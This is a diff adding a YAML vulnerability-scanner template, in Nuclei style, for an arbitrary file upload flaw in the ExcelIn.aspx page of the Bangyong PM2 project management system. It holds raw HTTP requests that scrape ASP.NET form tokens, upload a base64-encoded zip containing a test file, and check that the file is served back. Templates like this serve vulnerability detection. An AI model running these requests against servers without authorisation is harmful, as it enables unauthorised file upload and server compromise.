@@ -1,0 +1,91 @@
+id: bangyong-pm2-ExcelIn-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 邦永PM2项目管理系统/FlowChartDefine/ExcelIn.aspx存在任意文件上传漏洞，导致获取服务器权限，造成系统严重危害。
+  reference:
+    - https://github.com/wy876/POC/blob/1ff8a0f8154bdaf1dbf0148f25af1d2d38d24f96/%E9%82%A6%E6%B0%B8PM2%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%B3%BB%E7%BB%9FExcelIn.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+    - https://mp.weixin.qq.com/s/-AcRScqoi8-rzDbhV3dxXA
+  tags: tags
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(8)}}"
+http:
+  - raw:
+      - |+
+        GET /FlowChartDefine/ExcelIn.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /FlowChartDefine/ExcelIn.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 1196
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: http://{{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryomSD5oTP{{boundary}}
+        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.6478.54 Mobile/15E148 Safari/604.1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Referer: http://{{Hostname}}/FlowChartDefine/ExcelIn.aspx
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=ckol3udux02apxthj0ocrat3
+        sec-ch-ua-platform: "iOS"
+        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
+        sec-ch-ua-mobile: ?1
+        Connection: close
+
+        ------WebKitFormBoundaryomSD5oTP{{boundary}}
+        Content-Disposition: form-data; name="__VIEWSTATE"
+
+        {{VIEWSTATE}}
+        ------WebKitFormBoundaryomSD5oTP{{boundary}}
+        Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+        {{VIEWSTATEGENERATOR}}
+        ------WebKitFormBoundaryomSD5oTP{{boundary}}
+        Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+        {{EVENTVALIDATION}}
+        ------WebKitFormBoundaryomSD5oTP{{boundary}}
+        Content-Disposition: form-data; name="FileUpload1"; filename="{{filename}}.zip"
+        Content-Type: application/zip
+
+        {{base64_decode("UEsDBBQAAQAAAO9s+lgcOvXLEQAAAAUAAAAIAAAAMTIzNC50eHSwDAEI0SHRVXYg+myb9FH9+FBLAQI/ABQAAQAAAO9s+lgcOvXLEQAAAAUAAAAIACQAAAAAAAAAIAAAAAAAAAAxMjM0LnR4dAoAIAAAAAAAAQAYAAWNnS4e39oBAAAAAAAAAAAAAAAAAAAAAAAAUEsFBgAAAAABAAEAWgAAADcAAAAAAA==")}}
+        ------WebKitFormBoundaryomSD5oTP{{boundary}}
+        Content-Disposition: form-data; name="Button1"
+
+        模块导入
+        ------WebKitFormBoundaryomSD5oTP{{boundary}}--
+      - |+
+        GET /FlowChartDefine/1234.txt HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: VIEWSTATE
+        group: 1
+        regex:
+           - 'id="__VIEWSTATE" value="(\S*)"'
+        internal: true
+
+
+      - type: regex
+        name: EVENTVALIDATION
+        group: 1
+        regex:
+           - 'id="__EVENTVALIDATION" value="(\S*)"'
+        internal: true
+        
+      - type: regex
+        name: VIEWSTATEGENERATOR
+        group: 1
+        regex:
+           - 'id="__VIEWSTATEGENERATOR" value="(\S*)"'
+        internal: true
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '12345'
